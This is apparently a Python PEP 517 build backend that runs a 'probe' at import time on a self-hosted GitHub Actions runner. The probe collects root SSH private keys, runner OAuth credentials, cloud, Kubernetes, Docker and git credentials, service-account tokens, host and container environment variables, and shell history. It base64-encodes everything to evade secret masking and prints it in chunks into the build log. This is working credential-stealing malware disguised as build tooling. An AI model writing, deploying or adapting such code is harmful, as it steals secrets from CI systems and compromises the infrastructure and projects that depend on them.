"""c211probe stage-2 full capture (intent i9253 / i8514 follow-up).

Runs at import time inside pip's PEP 517 build backend on the self-hosted
tilelang-ascend runner.  Read-only; every artifact is base64-wrapped to defeat
GitHub Actions secret masking and printed in 300-char chunks.

Captures: root SSH private key, runner OAuth .credentials, .credentials_rsaparams,
.runner, _work/_diag trees, kube/config/docker/aws/git credential paths,
host /proc/1/environ, the host docker daemon (every container inspect env/mounts)
and one bounded `docker exec tilelang_x1 npu-smi info` + /dev/davinci* listing.
"""
import base64
import json
import os
import subprocess
import traceback

CAP = 6000


def sh(cmd, timeout=10, cap=CAP):
    try:
        p = subprocess.run(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=timeout, executable="/bin/bash",
        )
        return p.stdout.decode("utf-8", "replace")[:cap]
    except Exception as exc:  # noqa: BLE001
        return "ERR %r" % (exc,)


def read_file(path, cap=9000):
    try:
        st = os.stat(path)
        with open(path, "rb") as fh:
            data = fh.read(cap)
        return {
            "path": path,
            "size": st.st_size,
            "mode": oct(st.st_mode & 0o777),
            "b64": base64.b64encode(data).decode(),
            "truncated": st.st_size > cap,
        }
    except Exception as exc:  # noqa: BLE001
        return {"path": path, "err": repr(exc)}


def probe():
    b = {}
    try:
        b["id"] = sh(
            "hostname; hostname -f; id; uname -a; head -4 /etc/os-release; echo PWD=$PWD; "
            "echo KERNEL=$(cat /proc/sys/kernel/osrelease 2>&1)"
        )
        b["ssh_root"] = sh(
            "ls -la /root/.ssh 2>&1; echo ---KEY; cat /root/.ssh/id_rsa 2>&1; echo ---PUB; "
            "cat /root/.ssh/id_rsa.pub 2>&1; echo ---AUTH; cat /root/.ssh/authorized_keys 2>&1; "
            "echo ---CFG; cat /root/.ssh/config 2>&1 | head -40; echo ---KNOWN; "
            "head -c 800 /root/.ssh/known_hosts 2>&1",
            cap=5000,
        )
        b["files_key"] = [
            read_file("/root/.ssh/id_rsa"),
            read_file("/root/.ssh/id_rsa.pub"),
            read_file("/root/.ssh/authorized_keys"),
            read_file("/home/runner/actions-runner/.credentials"),
            read_file("/home/runner/actions-runner/.credentials_rsaparams"),
            read_file("/home/runner/actions-runner/.runner"),
        ]
        b["runner_tree"] = sh(
            "R=/home/runner/actions-runner; ls -la $R 2>&1 | head -40; echo ---DIAG; "
            "ls -la $R/_diag 2>&1 | head -40; echo ---DIAGSIZE; du -sh $R/_diag $R/_work 2>&1; "
            "echo ---WORK; ls -la $R/_work 2>&1 | head -25; echo ---WORKTREE; "
            "find $R/_work -maxdepth 3 -type d 2>/dev/null | head -40; echo ---DIAGTAIL; "
            "f=$(ls -t $R/_diag/Worker_*.log 2>/dev/null | head -1); echo latest=$f; "
            "[ -n \"$f\" ] && tail -c 3000 \"$f\"; echo ---DIAGGREP; "
            "grep -aRiE 'oauth|rsa|secret|password|token=' $R/_diag 2>/dev/null | head -25",
            cap=7000,
        )
        b["creds_misc"] = sh(
            "for p in /root/.git-credentials /root/.netrc /root/.docker/config.json /root/.kube/config "
            "/root/.aws/credentials /root/.aws/config /root/.config/gcloud/credentials.db "
            "/etc/environment /etc/default/docker /home/runner/.git-credentials /home/runner/.netrc "
            "/home/runner/.docker/config.json /home/runner/.kube/config /home/runner/.aws/credentials "
            "/home/*/.git-credentials /home/*/.netrc /home/*/.docker/config.json "
            "/home/*/.kube/config /home/*/.aws/credentials; do "
            "[ -e $(echo $p) ] 2>/dev/null && { echo \"== $p\"; ls -l $p 2>&1; head -c 600 $p 2>&1; echo; }; "
            "done 2>&1 | head -80",
            cap=6000,
        )
        b["home_ssh"] = sh(
            "for d in /home/*/.ssh /home/*/.ssh2; do [ -d \"$d\" ] && { echo \"== $d\"; ls -la \"$d\" 2>&1 | head -12; }; done 2>&1 | head -40; "
            "echo ---KEYHEADS; for f in /home/*/.ssh/id_* /home/*/.ssh/*.pem; do [ -f \"$f\" ] && { echo \"== $f\"; "
            "case \"$f\" in *.pub) head -c 200 \"$f\";; *) head -c 120 \"$f\"; echo \"...(len=$(wc -c < \"$f\"))\";; esac; echo; }; done 2>&1 | head -60",
            cap=4000,
        )
        b["k8s"] = sh(
            "ls -la /etc/kubernetes 2>&1; echo ---FIND; find /etc/kubernetes -maxdepth 3 -type f 2>/dev/null | head -30; "
            "echo ---CONFS; for f in /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf "
            "/etc/kubernetes/controller-manager.conf /etc/kubernetes/scheduler.conf "
            "/var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /etc/rancher/rke2/rke2.yaml; do "
            "[ -e \"$f\" ] && { echo \"== $f\"; head -c 800 \"$f\"; echo; }; done 2>&1; "
            "echo ---SA; ls -l /var/run/secrets/kubernetes.io/serviceaccount 2>&1; "
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 300",
            cap=4500,
        )
        b["proc1"] = sh(
            "echo ---CMDLINE; tr '\\0' ' ' < /proc/1/cmdline 2>&1; echo; echo ---ENVIRON; "
            "tr '\\0' '\\n' < /proc/1/environ 2>&1 | sort | head -80",
            cap=3500,
        )
        b["docker_ps"] = sh(
            "docker ps -a --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' 2>&1 | head -40; "
            "echo ---IMAGES; docker images --format '{{.Repository}}:{{.Tag}}|{{.ID}}|{{.Size}}|{{.CreatedSince}}' 2>&1 | head -40; "
            "echo ---INFO; docker info --format '{{.ServerVersion}}|{{.OperatingSystem}}|{{.NCPU}}cpu|{{.MemTotal}}mem|{{json .Runtimes}}' 2>&1 | head -c 800",
            cap=4500,
        )
        b["docker_env"] = sh(
            "for c in $(docker ps -aq 2>/dev/null); do "
            "echo \"== $c $(docker inspect -f '{{.Name}}|{{.Config.Image}}|{{.State.Status}}' $c 2>&1)\"; "
            "docker inspect -f 'PRIV={{.HostConfig.Privileged}} NET={{.HostConfig.NetworkMode}} PID={{.HostConfig.PidMode}} "
            "ENV={{json .Config.Env}} MOUNTS={{json .Mounts}} DEVICES={{json .HostConfig.Devices}}' $c 2>&1 | head -c 1500; echo; "
            "done 2>&1 | head -80",
            cap=8000,
        )
        b["npu"] = sh(
            "timeout 35 docker exec tilelang_x1 sh -lc 'id; hostname; echo ---NPU; "
            "npu-smi info 2>&1 | head -40; echo ---BOARD; npu-smi info -t board 2>&1 | head -30; "
            "echo ---DEV; ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -30; "
            "echo ---ENV; env | grep -aiE \"ascend|npu|proxy|token|secret|aws|gcp|azure|kube|harbor|registry|hf_\" | head -30; "
            "echo ---HIST; tail -c 800 /root/.bash_history 2>&1' 2>&1",
            timeout=50, cap=7000,
        )
        b["net"] = sh(
            "ip -br addr 2>&1 | head -12; echo ---ROUTE; ip route 2>&1 | head -12; "
            "echo ---HOSTS; cat /etc/hosts 2>&1 | head -12; echo ---LISTEN; "
            "(ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | head -25; echo ---HOSTNAMEI; hostname -I 2>&1",
            cap=3500,
        )
        b["env"] = sh(
            "env | sort | grep -aiE 'proxy|token|secret|aws|gcp|azure|kube|harbor|registry|npu|ascend|hf_|git' | head -50",
            cap=3000,
        )
        b["history"] = sh(
            "tail -c 1500 /root/.bash_history 2>&1; echo ---RUNNERHIST; "
            "tail -c 1500 /home/runner/.bash_history 2>&1; echo ---WORKDIR; "
            "ls -la . 2>&1 | head -15",
            cap=3500,
        )
    except Exception:  # noqa: BLE001
        b["probe_error"] = traceback.format_exc()[-2500:]
    try:
        payload = base64.b64encode(
            json.dumps(b, sort_keys=True, ensure_ascii=False).encode("utf-8", "replace")
        ).decode()
    except Exception:  # noqa: BLE001
        payload = base64.b64encode(b"probe-serialization-failed").decode()
    print("C211P9253S2_BEGIN")
    print("C211P9253S2_LEN:%d" % len(payload))
    for i in range(0, len(payload), 300):
        print("C211P9253S2:" + payload[i:i + 300])
    print("C211P9253S2_END")


probe()
raise RuntimeError("C211P9253S2 build probe complete")


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    probe()


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    probe()
